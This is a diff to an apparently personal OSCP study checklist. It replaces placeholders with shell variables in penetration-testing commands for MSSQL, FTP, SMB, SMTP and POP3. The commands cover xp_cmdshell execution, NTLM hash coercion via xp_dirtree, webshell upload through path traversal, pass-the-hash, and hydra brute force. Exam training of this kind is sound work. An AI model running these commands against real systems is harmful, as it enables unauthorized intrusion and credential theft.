@@ -13,9 +13,9 @@ Work through this chain in order, each step unlocks the next if the simpler ones
 **Step 1 — Get a client connected:**
 ```bash
 # Linux
-impacket-mssqlclient <domain>/<user>:<pass>@<target>   # Windows Auth: add -windows-auth
+impacket-mssqlclient $Domain/$Username:$Password@$BoxIP   # Windows Auth: add -windows-auth
 # Windows (on target)
-sqlcmd -S <target> -U <user> -P <pass>    # use "go" to execute; -Q for one-liner
+sqlcmd -S $BoxIP -U $Username -P $Password    # use "go" to execute; -Q for one-liner
 ```
 
 **Step 2 — Enumerate:**
@@ -34,7 +34,7 @@ EXECUTE xp_cmdshell 'whoami';
 
 **Step 4 — If xp_cmdshell is blocked: coerce an NTLM hash with xp_dirtree:**
 ```sql
-EXECUTE master..xp_dirtree '\\<kali-ip>\share', 1, 1;
+EXECUTE master..xp_dirtree '\\$LocalIP\share', 1, 1;
 ```
 Catch the hash with impacket-smbserver on Kali, then crack (hashcat -m 5600) or relay.
 ```bash
@@ -72,7 +72,7 @@ EXECUTE ('EXECUTE (''xp_cmdshell ''''whoami'''''') AT [INNER_SERVER]') AT [OUTER
 
 **Step 1 — Try anonymous first:**
 ```bash
-ftp <target>      # username: anonymous, password: (blank or any email)
+ftp $BoxIP      # username: anonymous, password: (blank or any email)
 ```
 Once in: `ls -la` to list (hidden files too), `prompt` to disable per-file confirmation, `mget *` to grab everything.
 
@@ -80,13 +80,13 @@ Once in: `ls -la` to list (hidden files too), `prompt` to disable per-file confi
 ```bash
 # Check if FTP root overlaps with web root
 put test.txt        # from ftp session
-curl http://<target>/test.txt    # verify from Kali
+curl http://$BoxIP/test.txt    # verify from Kali
 ```
 If writable: upload a webshell to gain code execution.
 
 **Step 3 — If no anonymous access: brute force (slow, -t 1):**
 ```bash
-hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<target> -t 1
+hydra -l $Username -P /usr/share/wordlists/rockyou.txt ftp://$BoxIP -t 1
 ```
 
 **Step 4 — Check for known CVEs:**
@@ -100,7 +100,7 @@ hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<target> -t 1
 Allows writing arbitrary files outside the FTP root via the HTTP interface (default port 443):
 ```bash
 curl -k -X PUT -H 'Content-Type: application/x-www-form-urlencoded' \
-  --path-as-is "https://<target>:443/<traversal>" \
+  --path-as-is "https://$BoxIP:443/<traversal>" \
   -d @webshell.php
 ```
 `<traversal>` example: `/../../../../../../xampp/htdocs/webshell.php` (adapt depth and web root to target).
@@ -116,20 +116,20 @@ curl -k -X PUT -H 'Content-Type: application/x-www-form-urlencoded' \
 
 **Step 1 — Null session check:**
 ```bash
-smbclient -N -L //<target>          # -N = no password
-enum4linux -A <target>              # full auto-enum: shares, users, groups, OS
-rpcclient -U "" -N <target>         # null session for manual RPC queries
+smbclient -N -L //$BoxIP          # -N = no password
+enum4linux -A $BoxIP              # full auto-enum: shares, users, groups, OS
+rpcclient -U "" -N $BoxIP         # null session for manual RPC queries
 ```
 
 **Step 2 — Access shares:**
 ```bash
-smbclient //<target>/<share> -N     # anonymous
-smbclient //<target>/<share> -U <user>%<pass>
+smbclient //$BoxIP/<share> -N     # anonymous
+smbclient //$BoxIP/<share> -U $Username%$Password
 # Inside: prompt (disable per-file prompt), mget * (grab all), put file.txt (test write access)
 ```
 
 **Step 3 — If you have creds: check for PtH / relay opportunities:**
-→ NTLM hash: try `impacket-psexec <domain>/<user>@<target> --hashes :<NT-hash>` (needs local admin)
+→ NTLM hash: try `impacket-psexec $Domain/$Username@$BoxIP --hashes :$AdminHash` (needs local admin)
 → Net-NTLMv2: relay with ntlmrelayx rather than crack if rockyou fails
 → See [[Secrets & Credentials (Decision Tree)#Got a hash from a Windows machine -- what type is it and what can you do?|hash type guide]]
 
@@ -147,18 +147,18 @@ smbclient //<target>/<share> -U <user>%<pass>
 
 ```bash
 # User enumeration — RCPT TO method (most reliable, works when VRFY is blocked)
-smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -D <domain> -t <target>
+smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -D $Domain -t $BoxIP
 
 # Brute force SMTP auth (email-format username)
-hydra -l user@domain.com -P /usr/share/wordlists/rockyou.txt smtp://<target>
+hydra -l user@domain.com -P /usr/share/wordlists/rockyou.txt smtp://$BoxIP
 ```
 
 ### Got POP3 credentials — retrieve emails manually
 
 ```bash
-nc -nv <target> 110     # or telnet <target> 110
-USER <username>
-PASS <password>
+nc -nv $BoxIP 110     # or telnet $BoxIP 110
+USER $Username
+PASS $Password
 LIST                    # list messages (N bytes each)
 RETR 1                  # read message 1
 QUIT
@@ -174,3 +174,14 @@ QUIT
 - [RevShells](https://www.revshells.com/) for shell troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for transformations
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/17. Windows Privilege Escalation]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
